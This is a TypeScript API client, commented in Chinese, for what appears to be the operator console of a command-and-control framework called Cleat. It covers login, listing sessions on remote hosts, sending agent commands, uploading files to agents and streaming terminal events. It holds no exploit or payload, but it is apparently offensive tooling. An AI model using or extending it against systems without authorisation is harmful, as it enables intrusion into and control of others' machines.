// Cleat TeamServer API 封装 —— 薄适配层(设计参照 cleat-web/src/api/cleat/client.ts)。
// 职责: Bearer 注入 / 401 处理 / SSE 流读取 / 二进制分块上传。业务调用一律经此文件。
const TOKEN_KEY = 'cleat_token'
const USER_KEY = 'cleat_user'
const ROLE_KEY = 'cleat_role'

export interface CleatUser {
  username: string
  role: string
}

export function getToken(): string | null {
  return localStorage.getItem(TOKEN_KEY)
}

export function getUser(): CleatUser | null {
  const u = localStorage.getItem(USER_KEY)
  const r = localStorage.getItem(ROLE_KEY)
  if (!u) return null
  return { username: u, role: r || 'viewer' }
}

export function saveAuth(token: string, username: string, role: string): void {
  localStorage.setItem(TOKEN_KEY, token)
  localStorage.setItem(USER_KEY, username)
  localStorage.setItem(ROLE_KEY, role)
}

export function clearAuth(): void {
  localStorage.removeItem(TOKEN_KEY)
  localStorage.removeItem(USER_KEY)
  localStorage.removeItem(ROLE_KEY)
}

/** 401 时在途请求集合(防重复跳转) */
let redirecting = false

/** 统一响应处理: 401 → 清登录态跳登录; 非 2xx → 抛 problem+json 的 detail */
async function finish<T>(resp: Response): Promise<T> {
  if (resp.status === 401) {
    clearAuth()
    if (!redirecting && !location.pathname.includes('sign-in')) {
      redirecting = true
      location.href = '/sign-in'
    }
    throw new Error('会话已失效，请重新登录')
  }
  const text = await resp.text()
  if (!resp.ok) {
    let msg = `HTTP ${resp.status}`
    try {
      const j = JSON.parse(text)
      msg = j.detail || j.message || msg
    } catch {
      /* 非 JSON 错误体 */
    }
    throw new Error(msg)
  }
  if (!text) return {} as T
  return JSON.parse(text) as T
}

async function request<T>(path: string, init: RequestInit = {}): Promise<T> {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    ...((init.headers as Record<string, string>) || {}),
  }
  const token = getToken()
  if (token) headers.Authorization = `Bearer ${token}`

  const resp = await fetch(path, { ...init, headers })
  return finish<T>(resp)
}

/** 二进制 POST(上传分块/混合命令): 原始字节体 + Bearer, 同套 401/错误处理 */
export async function postBinary<T>(path: string, body: Uint8Array, contentType: string, timeoutMs?: number): Promise<T> {
  const headers: Record<string, string> = { 'Content-Type': contentType }
  const token = getToken()
  if (token) headers.Authorization = `Bearer ${token}`
  const resp = await fetch(path, {
    method: 'POST',
    headers,
    body: body as unknown as BodyInit,
    signal: timeoutMs ? AbortSignal.timeout(timeoutMs) : undefined,
  })
  return finish<T>(resp)
}

export const api = {
  get: <T>(path: string) => request<T>(path),
  post: <T>(path: string, body?: unknown, init?: RequestInit) =>
    request<T>(path, { method: 'POST', body: body ? JSON.stringify(body) : undefined, ...init }),
  put: <T>(path: string, body?: unknown) =>
    request<T>(path, { method: 'PUT', body: body ? JSON.stringify(body) : undefined }),
  del: <T>(path: string) => request<T>(path, { method: 'DELETE' }),
}

// ---------- 业务接口 ----------

export interface SessionRow {
  id: number
  remote_ip: string
  hostname: string
  os: string
  cpu: string
  memory: string
  local_ip: string
  pid: number
  process_name: string
  privilege: string
  last_seen: number
  online: boolean
  transport: string
}

export interface CommandResponse {
  status?: string
  message?: string
  error?: string
  [key: string]: unknown
}

export async function login(username: string, password: string): Promise<CleatUser & { token: string }> {
  const resp = await api.post<{ token: string; username: string; role: string }>('/api/login', {
    username,
    password,
  })
  saveAuth(resp.token, resp.username, resp.role)
  return resp as CleatUser & { token: string }
}

export function listSessions() {
  return api.get<{ sessions: SessionRow[] }>('/api/sessions')
}

/** Agent 命令往返超时(≥ 服务端 RespTimeout 300s; 睡眠掩码下最坏 ~244s, 对齐 cleat-web 同参数) */
const AGENT_ROUNDTRIP_TIMEOUT = 310_000

/**
 * 发送单条 Agent 命令(push/pull 模式, 同步等待响应)。
 * 对齐 cleat-web: TS 对 Agent 的 Packet::Error 以 HTTP 200 + status=error 回传,
 * 必须检查命令层失败; 前端超时须 ≥ 服务端上限, 否则"数据没回来前端先超时"。
 */
export function sendCommand<T = unknown>(
  sessionId: number,
  cmd: string,
  params: Record<string, unknown> = {},
  mode: 'push' | 'pull' = 'push'
) {
  return api
    .post<CommandResponse & { data?: T }>(
      `/api/sessions/${sessionId}/command`,
      { cmd, params, mode },
      { signal: AbortSignal.timeout(AGENT_ROUNDTRIP_TIMEOUT) }
    )
    .then((resp) => {
      if (resp && resp.status === 'error') {
        throw new Error(String(resp.message || resp.error || `命令 ${cmd} 执行失败`))
      }
      return resp
    })
}

/**
 * 上传单个分块(Server → Agent, 原始字节经后端混合帧转发; 等 Agent 回执 → 长超时)。
 * 流程: FileUploadReq(path,total_size,total_chunks) 拿 task_id → 逐块调本接口。
 */
export function uploadChunk(sessionId: number, taskId: string, chunkIndex: number, bytes: Uint8Array) {
  return postBinary<CommandResponse>(
    `/api/sessions/${sessionId}/upload-chunk?task_id=${encodeURIComponent(taskId)}&chunk_index=${chunkIndex}`,
    bytes,
    'application/octet-stream',
    AGENT_ROUNDTRIP_TIMEOUT
  )
}

// ---------- SSE 事件流 ----------

export interface CleatEvent {
  type: string
  session_id?: number
  data?: Record<string, unknown>
  ts?: number
  seq?: number
}

/**
 * 连接"会话级"事件流(terminal_output / file_download_data 等会话事件走这里;
 * 全局 /api/events 只有上下线/落盘事件)。返回断开函数; 断线 3s 自动重连。
 * onOpen: 首次建流成功回调 —— 下载场景必须等订阅生效后再发 FileDownloadReq, 否则分块会漏。
 */
export function connectSessionEvents(
  sessionId: number,
  onEvent: (ev: CleatEvent) => void,
  onOpen?: () => void
): () => void {
  return connectSSE(`/api/sessions/${sessionId}/events`, onEvent, onOpen)
}

/** 连接"全局"事件流(/api/events: session_online / session_offline / event_log 等)。 */
export function connectGlobalEvents(onEvent: (ev: CleatEvent) => void): () => void {
  return connectSSE('/api/events', onEvent)
}

/** SSE 通用实现: fetch 流式读取 + 帧解析 + 断线重连。 */
function connectSSE(url: string, onEvent: (ev: CleatEvent) => void, onOpen?: () => void): () => void {
  const ac = new AbortController()
  let closed = false
  let openedOnce = false

  const loop = async () => {
    while (!closed) {
      try {
        const resp = await fetch(url, {
          headers: { Authorization: `Bearer ${getToken() || ''}`, Accept: 'text/event-stream' },
          signal: ac.signal,
        })
        if (!resp.ok || !resp.body) throw new Error(`SSE HTTP ${resp.status}`)
        if (onOpen && !openedOnce) {
          openedOnce = true
          onOpen()
        }
        const reader = resp.body.getReader()
        const decoder = new TextDecoder()
        let buf = ''
        for (;;) {
          const { done, value } = await reader.read()
          if (done) break
          buf += decoder.decode(value, { stream: true })
          // SSE 帧以空行分隔
          let idx
          while ((idx = buf.indexOf('\n\n')) >= 0) {
            const frame = buf.slice(0, idx)
            buf = buf.slice(idx + 2)
            for (const line of frame.split('\n')) {
              if (line.startsWith('data:')) {
                const raw = line.slice(5).trim()
                if (!raw) continue
                try {
                  const ev = JSON.parse(raw) as CleatEvent
                  onEvent(ev)
                } catch {
                  /* 忽略非 JSON 帧 */
                }
              }
            }
          }
        }
      } catch {
        if (closed || ac.signal.aborted) return
      }
      if (!closed) await new Promise((r) => setTimeout(r, 3000)) // 断线重连
    }
  }
  void loop()

  return () => {
    closed = true
    ac.abort()
  }
}
